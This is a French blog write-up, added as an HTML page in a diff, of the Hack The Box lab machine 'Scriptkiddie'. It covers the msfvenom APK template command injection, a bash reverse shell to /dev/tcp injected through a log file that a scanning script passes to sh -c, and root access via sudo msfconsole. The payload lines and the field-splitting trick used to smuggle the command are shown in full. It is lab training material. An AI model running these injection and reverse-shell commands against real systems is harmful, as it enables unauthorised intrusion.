@@ -1,0 +1,571 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Scriptkiddie &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Scriptkiddie - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Scriptkiddie">
+    <meta itemprop="description" content="Hack The Box - Scriptkiddie - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Scriptkiddie">
+    <meta property="og:description" content="Hack The Box - Scriptkiddie - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/scriptkiddie/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/scriptkiddie/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/scriptkiddie/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/scriptkiddie/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/scriptkiddie/">
+            Hack The Box - Scriptkiddie
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-06-06</span>
+            
+        
+
+        
+            
+                <span class="readingTime">5 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/linux/">linux</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/scriptkiddie/script-fiche.png" alt=""></p>
+<p>Scriptkiddie est une <a href="https://app.hackthebox.eu/machines/Scriptkiddie">machine</a> facile qui a été déployée sur Hack The Box le samedi 6 février 2021 and crée par <strong>0xdf</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-nmap">Scan Nmap</a></li>
+        <li><a href="#enumération-web">Enumération web</a></li>
+        <li><a href="#première-connexion---utilisateur-kid">Première connexion - utilisateur kid</a></li>
+        <li><a href="#utilisateur-pwn">Utilisateur pwn</a></li>
+        <li><a href="#elévation-de-privilèges">Elévation de privilèges</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-nmap">Scan Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+5000/tcp open  http    Werkzeug httpd 0.16.1 <span style="color:#f92672">(</span>Python 3.8.5<span style="color:#f92672">)</span>
+|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
+|_http-title: k1d<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">5</span> h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>On retrouve :</p>
+<ul>
+<li>un service <code>SSH/22</code></li>
+<li>un service web <code>Werkzeug httpd/5000</code></li>
+<li>système d&rsquo;exploitation Linux</li>
+</ul>
+<h3 id="enumération-web">Enumération web</h3>
+<p><a href="https://werkzeug.palletsprojects.com/en/1.0.x/">Werkzeug</a> est une bibliothèque complète d&rsquo;application web WSGI. Elle est compatible unicode et n&rsquo;impose aucune dépendance.
+<a href="https://fr.wikipedia.org/wiki/Web_Server_Gateway_Interface">WSGI</a> est une spécification qui décrit comment un serveur web communique avec des applications web.</p>
+<p>En regardant le site web sous <code>10.10.10.226:5000</code>, une page s&rsquo;affiche avec la possibilité d&rsquo;utiliser des outils dont <code>nmap, un générateur de payloads msfvenom et searchsploit.</code></p>
+<p><img src="/img/scriptkiddie/script-site.png" alt=""></p>
+<p>Quand j&rsquo;essaye de créer un payload Linux ou Windows, j&rsquo;obtiens le message <code>Something went wrong</code>.</p>
+<p><img src="/img/scriptkiddie/script-some.png" alt=""></p>
+<p>En revanche, si j&rsquo;essaye de générer un payload android, j&rsquo;obtiens un retour.</p>
+<p><img src="/img/scriptkiddie/script-apk.png" alt=""></p>
+<p>En recherchant depuis l&rsquo;outil searchsploit <code>venom APK</code>, je trouve un exploit qui permet de faire une injection de commande dans un template APK, la <a href="https://www.exploit-db.com/exploits/49491">CVE-2020-7374</a>.</p>
+<p><img src="/img/scriptkiddie/script-search.png" alt=""></p>
+<h3 id="première-connexion---utilisateur-kid">Première connexion - utilisateur kid</h3>
+<p>On commence par générer notre payload <code>.apk</code></p>
+<p><img src="/img/scriptkiddie/script-payload.png" alt=""></p>
+<p>Je déplace le fichier dans le répertoire courant et ouverture d&rsquo;un listener sur le port <code>1337</code>.</p>
+<p><img src="/img/scriptkiddie/script-list.png" alt=""></p>
+<p>Et j&rsquo;upload le fichier sur le site</p>
+<p><img src="/img/scriptkiddie/script-foothold.png" alt=""></p>
+<p>J&rsquo;obtiens un shell en tant qu&rsquo;utilisateur <code>kid</code> et le stabilise.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/infosec/htb<span style="color:#f92672">]</span>
+└──╼ $nc -lvnp <span style="color:#ae81ff">1337</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.35<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">47042</span>
+python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+kid@scriptkiddie:~/html$
+kid@scriptkiddie:~/html$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+  Stopped                 nc -lvnp <span style="color:#ae81ff">1337</span>
+┌─<span style="color:#f92672">[</span>✗<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/infosec/htb<span style="color:#f92672">]</span>
+└──╼ $stty raw -echo; fg
+nc -lvnp <span style="color:#ae81ff">1337</span>
+
+kid@scriptkiddie:~/html$ export TERM<span style="color:#f92672">=</span>xterm
+kid@scriptkiddie:~/html$ id;date
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span>
+Sat Apr <span style="color:#ae81ff">10</span> 17:25:10 UTC <span style="color:#ae81ff">2021</span>
+</code></pre></div><p>On trouve le premier flag <code>user.txt</code>. 😊</p>
+<p><img src="/img/scriptkiddie/script-user.txt.png" alt=""></p>
+<h3 id="utilisateur-pwn">Utilisateur pwn</h3>
+<p>Après une énumération classique (kernel, SUID, sudo -l&hellip;), je retrouve un autre utilisateur <code>pwn</code> à l&rsquo;aide de la commande <code>/etc/passwd</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+kid:x:1000:1000:kid:/home/kid:/bin/bash
+pwn:x:1001:1001::/home/pwn:/bin/bash
+</code></pre></div><p>Il est propriétaire d&rsquo;un script bash intéressant</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kid@scriptkiddie:/home/pwn$ ls -la
+total <span style="color:#ae81ff">44</span>
+drwxr-xr-x <span style="color:#ae81ff">6</span> pwn  pwn  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 12:06 .
+drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">3</span> 12:06 .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> pwn  pwn   <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> pwn  pwn  <span style="color:#ae81ff">3771</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> pwn  pwn  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">28</span> 17:08 .cache
+drwxrwxr-x <span style="color:#ae81ff">3</span> pwn  pwn  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">28</span> 17:24 .local
+-rw-r--r-- <span style="color:#ae81ff">1</span> pwn  pwn   <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
+-rw-rw-r-- <span style="color:#ae81ff">1</span> pwn  pwn    <span style="color:#ae81ff">74</span> Jan <span style="color:#ae81ff">28</span> 16:22 .selected_editor
+drwx------ <span style="color:#ae81ff">2</span> pwn  pwn  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 16:10 .ssh
+drwxrw---- <span style="color:#ae81ff">2</span> pwn  pwn  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 15:50 recon
+-rwxrwxr-- <span style="color:#ae81ff">1</span> pwn  pwn   <span style="color:#ae81ff">250</span> Jan <span style="color:#ae81ff">28</span> 17:57 scanlosers.sh
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+
+log<span style="color:#f92672">=</span>/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u | <span style="color:#66d9ef">while</span> read ip; <span style="color:#66d9ef">do</span>
+    sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">.nmap </span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
+<span style="color:#66d9ef">done</span>
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>wc -l &lt; $log<span style="color:#66d9ef">)</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo -n &gt; $log; <span style="color:#66d9ef">fi</span>
+</code></pre></div><p>On retrouve une variable <code>$log</code> qui fait appelle au fichier  <code>/home/kid/logs/hackers</code>. Si on se place dans le répertoire <code>/home/kid/logs</code> je peux ajouter du contenu, mais il est automatiquement supprimé au bout d&rsquo;un certain temps. Je vais injecter un reverse shell TCP Bash pour me connecter avec le compte <code>pwn</code>.</p>
+<p>Payload :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kid@scriptkiddie:~/logs$ echo <span style="color:#e6db74">&#34;  ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/8888 0&gt;&amp;1&#39; #&#34;</span> &gt;&gt; hackers
+</code></pre></div><ul>
+<li>le <code>;</code> indique l&rsquo;interruption du script en cours pour exécuter notre payload.</li>
+<li>le symbole de commentaire <code>#</code> permet au reste du script d&rsquo;être interprété comme un commentaire.</li>
+</ul>
+<p>Il est important de mettre deux espaces après <code>echo &quot;</code>. Le script fait appel à la commande <a href="https://www.linuxtricks.fr/wiki/manipulation-de-chaine-cut-awk-tr">cut</a> <code>cut -d' ' -f3-</code></p>
+<ul>
+<li>-d indique un séparateur de champ</li>
+<li>-f définit le nombre de champ à garder</li>
+</ul>
+<p>Pour terminer le paramètre <a href="https://www.linuxtricks.fr/wiki/manipulation-de-chaine-cut-awk-tr">-f3-</a> signifie <code>à partir du troisième champ</code>.</p>
+<p>Un exemple en local :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└──╼ $echo <span style="color:#e6db74">&#34;;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39; #&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3-
+<span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
+┌─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└──╼ $echo <span style="color:#e6db74">&#34;  ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39; #&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3-
+;/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
+┌─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└──╼ $echo <span style="color:#e6db74">&#34;;  /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39; #&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3-
+/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
+┌─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└──╼ $echo <span style="color:#e6db74">&#34;; /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39; #&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3-
+-c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.35/1337 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
+</code></pre></div><p>J&rsquo;ouvre un listener sur le port <code>8888</code> et j&rsquo;obtiens un shell en tant qu&rsquo;utilisateur <code>pwn</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">─<span style="color:#f92672">[</span>luks@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/.ssh<span style="color:#f92672">]</span>
+└──╼ $nc -lvnp <span style="color:#ae81ff">8888</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8888</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.35<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">58454</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>873<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+pwn@scriptkiddie:~$
+</code></pre></div><h3 id="elévation-de-privilèges">Elévation de privilèges</h3>
+<p>En utilisant la commande <code>sudo -l</code>, on voit qu&rsquo;on peut exécuter <code>msfconsole</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwn@scriptkiddie:~/.ssh$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre></div><p>Je lance metasploit avec la commande <code>sudo</code>, on peut voir que l&rsquo;on est connecté en <code>root</code>, je me rends sous <code>/root</code> et je récupère le dernier flag. 🥳</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwn@scriptkiddie:~/.ssh$ sudo msfconsole
+
+-- snippet --
+
+msf6 &gt; id ; date
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> exec: id ; date
+
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+Sun Apr <span style="color:#ae81ff">11</span> 11:16:46 UTC <span style="color:#ae81ff">2021</span>
+
+msf6 &gt; cd /root
+cd /root
+msf6 &gt; ls
+ls
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> exec: ls
+
+root.txt  snap
+</code></pre></div><p><img src="/img/scriptkiddie/script-root.txt.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/web/">web</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/python/">python</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/outdated-software/">outdated software</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/scriptkiddie/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
